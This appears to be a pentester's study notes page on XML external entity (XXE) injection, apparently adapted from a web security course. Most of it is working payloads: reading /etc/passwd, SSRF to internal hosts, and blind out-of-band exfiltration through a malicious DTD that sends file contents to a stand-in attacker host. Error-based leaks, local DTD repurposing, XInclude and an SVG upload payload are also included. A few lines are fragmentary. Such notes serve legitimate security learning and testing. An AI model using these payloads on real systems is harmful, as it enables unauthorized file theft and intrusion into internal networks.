# XXE Injection

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

`<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

### Exploiting XXE to perform SSRF attacks <a href="#exploiting-xxe-to-perform-ssrf-attacks" id="exploiting-xxe-to-perform-ssrf-attacks"></a>

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`

## Blind XXE

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`

To bypass input validation you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

### exfiltrate data <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band"></a>

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:

`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;`

This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
* Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
* Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

Place the Burp Collaborator payload into a malicious DTD file:

`<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;`

Finally, the attacker must submit the following XXE payload to the vulnerable application:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`

### XXE to retrieve data via error messages <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

`<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;`

### &#x20;XXE by repurposing a local DTD <a href="#exploiting-blind-xxe-by-repurposing-a-local-dtd" id="exploiting-blind-xxe-by-repurposing-a-local-dtd"></a>

For example, suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`. An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:

`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>`

#### Locating an existing DTD file to repurpose <a href="#locating-an-existing-dtd-file-to-repurpose" id="locating-an-existing-dtd-file-to-repurpose"></a>

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:

`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>`

## Finding hidden attack <a href="#finding-hidden-attack-surface-for-xxe-injection" id="finding-hidden-attack-surface-for-xxe-injection"></a>

### XInclude attacks <a href="#xinclude-attacks" id="xinclude-attacks"></a>

&#x20;you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead.&#x20;

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`

change a value

#### XXE attacks via file upload <a href="#xxe-attacks-via-file-upload" id="xxe-attacks-via-file-upload"></a>

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

{% code overflow="wrap" %}
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
{% endcode %}
